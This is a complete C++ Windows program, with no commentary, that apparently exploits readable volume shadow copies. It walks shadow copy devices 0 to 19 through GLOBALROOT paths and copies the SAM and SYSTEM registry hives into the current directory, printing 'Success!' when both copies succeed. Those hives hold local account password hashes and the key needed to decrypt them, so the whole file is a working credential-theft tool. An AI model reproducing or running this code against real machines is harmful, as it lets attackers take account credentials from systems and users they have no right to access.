#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <WTypes.h>

#include <iostream>
#include <sstream>
#include <string>
#include <vector>

#define BUFFER_SIZE 4096

bool CopyData(const wchar_t* szSrc, const wchar_t* szDst)
{
	std::vector<byte> buffer;
	buffer.resize(BUFFER_SIZE);
	bool result = false;

	HANDLE hSrc = nullptr;
	HANDLE hDst = nullptr;
	hSrc = CreateFileW(szSrc, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hSrc == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"[!] " << szSrc << " : " << GetLastError() << std::endl;
		goto CLEAN_AND_EXIT;
	}
	hDst = CreateFileW(szDst, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
	if (hDst == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"[!] " << szDst << " : " << GetLastError() << std::endl;
		goto CLEAN_AND_EXIT;
	}

	while (true)
	{
		DWORD dwBytesRead = 0;
		BOOL bStatus = ReadFile(hSrc, buffer.data(), BUFFER_SIZE, &dwBytesRead, nullptr);
		if (!bStatus || dwBytesRead == 0)
			break;

		DWORD dwBytesWritten = 0;
		bStatus = WriteFile(hDst, buffer.data(), dwBytesRead, &dwBytesWritten, nullptr);
		if (!bStatus || dwBytesRead != dwBytesWritten)
		{
			result = false;
			break;
		}
		result = true;
	}

CLEAN_AND_EXIT:
	SecureZeroMemory(buffer.data(), buffer.size());

	if (hSrc != nullptr && hSrc != INVALID_HANDLE_VALUE)
		CloseHandle(hSrc);
	if (hDst != nullptr && hDst != INVALID_HANDLE_VALUE)
		CloseHandle(hDst);
	return result;
}

int main(int argc, char* argv[])
{
	for (int i = 0; i < 20; i++)
	{
		std::wstringstream wssBaseDir;
		wssBaseDir << L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";
		wssBaseDir << i;
		wssBaseDir << "\\Windows\\System32\\config\\";

		std::wstringstream wssSystem;
		wssSystem << wssBaseDir.str();
		wssSystem << L"SYSTEM";
		if (!CopyData(wssSystem.str().c_str(), L"SYSTEM"))
			continue;

		std::wstringstream wssSam;
		wssSam << wssBaseDir.str();
		wssSam << L"SAM";
		if (!CopyData(wssSam.str().c_str(), L"SAM"))
			continue;

		std::wcout << L"Success!" << std::endl;
		break;
	}
	return 0;
}
